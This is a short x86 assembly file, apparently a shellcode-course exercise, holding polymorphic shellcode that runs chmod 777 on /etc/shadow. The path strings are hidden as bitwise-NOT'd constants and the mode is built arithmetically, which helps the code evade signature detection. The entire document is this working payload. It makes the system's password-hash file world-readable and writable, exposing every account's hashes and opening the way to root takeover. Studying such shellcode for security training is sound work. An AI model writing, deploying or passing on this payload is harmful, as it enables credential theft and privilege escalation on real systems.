; Shellcode Title: Polymorphic shellcode chmod 777 shadow
; Date: 24-02-2018
; Student Id: SLAE-1058
; Tested on: Ubuntu 12.04 LTS x86

global _start

section .text

_start:

	mov ebx, eax
	xor eax,ebx
	push eax

	; chmod syscall() - 15
	or al,0xf

	;original push dword 0x776f6461
	mov ebx, 0x88909b9e
	not ebx
	push ebx

	; original: push dword 0x68732f63
	mov ebx, 0x978cd09c
	not ebx
	push ebx

	; original: push dword 0x74652f2f
	mov ebx, 0x8b9ad0d0
	not ebx
	push ebx
	
	; chmod arguments
	mov ebx,esp
	xor ecx,ecx

	; print(oct(0x1ff)) == '0777'
	mov cl, 0xdc
	add cx, 0x123

	int 0x80

	; exit()
	inc eax
	int 0x80
